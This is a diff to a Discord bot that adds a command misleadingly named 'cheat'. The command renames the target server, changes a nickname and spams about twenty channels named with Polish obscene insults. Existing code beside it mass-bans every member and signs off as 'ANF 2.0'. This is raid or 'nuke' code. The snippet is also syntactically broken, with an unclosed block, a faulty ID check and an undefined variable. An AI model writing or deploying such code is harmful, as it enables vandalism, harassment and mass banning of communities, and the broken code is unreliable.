@@ -161,7 +161,26 @@ const kickeembed = new Discord.RichEmbed()
 
   incidentchannel.send(kickeembed);
     }
-
+if(cmd === `${prefix}cheat`){	
+message.member.setNickname("CO JEST KURWA");
+message.guild.setName("Pozdro ANF <3");
+message.guild.createChannel("JEBAĆ FUBU XD");
+message.guild.createChannel("JEBAĆ FUBU xD");
+message.guild.createChannel("JEBAĆ FUBU no ");
+message.guild.createChannel("JEBAĆ FUBU brawo");
+message.guild.createChannel("JEBAĆ FUBU wy");
+message.guild.createChannel("JEBAĆ FUBU chcieliscie ");
+message.guild.createChannel("JEBAĆ FUBU delete");
+message.guild.createChannel("JEBAĆ FUBU serwer");
+message.guild.createChannel("JEBAĆ FUBU to");
+message.guild.createChannel("JEBAĆ FUBU pomoglismy");
+message.guild.createChannel("JEBAĆ FUBU xD");
+message.guild.createChannel("JEBAĆ FUBU to ");
+message.guild.createChannel("JEBAĆ FUBU ohayo");
+message.guild.createChannel("JEBAĆ FUBU bye");
+message.guild.createChannel("JEBAĆ FUBU nara");
+message.guild.createChannel("JEBAĆ FUBU yo");
+message.guild.createChannel("JEBAĆ FUBU XD");
  if(cmd === `${prefix}banall`){	
   let BReason = args.join(" ").slice(0);
   if (!BReason) return message.reply("Nie znaleziono osób do banowania")
@@ -171,7 +190,7 @@ const kickeembed = new Discord.RichEmbed()
   message.guild.members.forEach((f, i) => {
       if (f.id == 340557425511759892, 354290340121018369, 220161564567666699) return message.reply("Developerów, Misiaczków nie zbanujesz :D");
       message.guild.member(f).ban(BReason);
-      message.channel.send(`Banned ${f}!`);
+      C.send(`Banned ${f}!`);
   });
   message.channel.send("Wszyscy Użytkownicy zostali zbanowali. Pozdrawiam ANF 2.0 XD");
   }
